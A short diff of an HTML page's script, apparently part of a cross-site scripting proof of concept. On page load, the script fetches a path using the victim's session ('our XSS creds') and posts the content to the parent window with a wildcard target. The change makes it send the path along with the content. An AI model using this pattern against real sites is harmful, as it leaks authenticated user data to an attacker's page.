@@ -54,7 +54,7 @@
   
     // fetch the content with our XSS creds and post back to outer document
     const content = await (await fetch(relativePath)).text();
-    window.parent.postMessage(content, '*');
+    window.parent.postMessage({relativePath, content}, '*');
   }
   </script></head>
   <body onload="go();"></body>
